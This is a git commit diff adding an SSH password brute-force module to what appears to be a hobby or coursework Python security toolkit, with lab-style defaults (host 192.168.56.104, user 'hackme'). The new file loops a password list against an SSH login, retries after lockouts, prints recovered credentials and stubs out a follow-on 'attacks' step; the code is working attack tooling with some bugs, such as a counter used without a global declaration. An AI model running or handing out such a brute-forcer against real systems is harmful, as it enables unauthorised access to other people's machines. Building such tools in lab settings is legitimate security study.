9d1281167efdcee6431496529b5955316d699b80
Jake Overall <joverall22@gmail.com>
2020-10-27 13:08:52 -0600

    adds brute force ssh

--- 08/main.py
+++ 08/main.py
@@ -1,23 +1,31 @@
 import signal
 import complexity
 import password_generator
+import ssh_brute
+import sys
+import banners
+import password_checker
 
 running = "Y"
 
 switcher = {
     "1": complexity.main,
     "2": password_generator.generate_password,
-    "3": quit,
+    "3": ssh_brute.main,
+    "4": quit,
 }
 
+
 def main():
+    banners.clear_screen()
     running = "Y"
     while running == "Y":
         try:
             print("""
 1. Check Password Complexity
 2. Generate Password
-3. Quit 
+3. SSH BRUTE
+4. Quit 
             """)
             option = input("> : ")
             if option in switcher:
@@ -41,4 +49,5 @@ def signal_handler(signal, frame):
 
 if __name__ == "__main__":
     signal.signal(signal.SIGINT, signal_handler)
+    password_checker.load_passwords()
     main()
---
+++ 08/ssh_brute.py
@@ -0,0 +1,95 @@
+import signal
+import paramiko
+import socket
+import time
+import colors
+import banners
+import password_checker
+
+timeout_attempts = 0
+
+
+def connect_ssh(hostname, username, password):
+    client = paramiko.SSHClient()
+    try:
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    except:
+        pass
+    try:
+        colors.print_warning(
+            f"[ATTEMPTING CONNECTION] || {hostname} || {username}:{password}")
+        client.connect(hostname=hostname, username=username,
+                       password=password, timeout=3)
+    except socket.timeout:
+        colors.print_fail(f"[!] Invalid Host: {hostname}")
+        raise BadHostException(hostname)
+    except paramiko.AuthenticationException:
+        return None
+    except paramiko.SSHException:
+        timeout_attempts += 1
+        if(timeout_attempts < 5):
+            colors.print_info(f"Time Locked retrying... {timeout_attempts}/5")
+            time.sleep(60)
+            return connect_ssh(hostname, username, password)
+        else:
+            raise MaxAttempsReachedException
+    except Exception as err:
+        raise err
+
+    colors.print_success("[+] CONNECTION ESTABLISHED:")
+
+    print(f"""
+    {colors.colors.ENDC}HOSTNAME: {colors.colors.HEADER}{hostname}
+    {colors.colors.ENDC}USERNAME: {colors.colors.HEADER}{username}
+    {colors.colors.ENDC}PASSWORD: {colors.colors.HEADER}{password}
+    {colors.colors.ENDC}
+    """)
+    return client
+
+
+def start_brute(host, username):
+    for password in password_checker.passwords:
+        try:
+            client = connect_ssh(host, username, password)
+            if(client):
+                return client
+        except BadHostException:
+            raise BadHostException
+        except MaxAttempsReachedException:
+            raise MaxAttempsReachedException
+        except Exception as err:
+            print(err)
+            return
+
+
+def start_client_attacks(client):
+    print("STARTING ATTACKS")
+    print("ATTACKS FINISHED")
+
+
+def main():
+    banners.clear_screen()
+    banners.ssh_brute_banner()
+    host = input("Host: ") or "192.168.56.104"
+    username = input("Username: ") or "hackme"
+    client = start_brute(host, username)
+    if(client and input("Start Attacks? [Y]/n: ").capitalize() == "Y"):
+        start_client_attacks(client)
+
+
+def signal_handler(signal, frame):
+    exit(0)
+
+
+class BadHostException(BaseException):
+    pass
+
+
+class MaxAttempsReachedException(BaseException):
+    pass
+
+
+if __name__ == "__main__":
+    signal.signal(signal.SIGINT, signal_handler)
+    main()
+    password_checker.load_passwords()
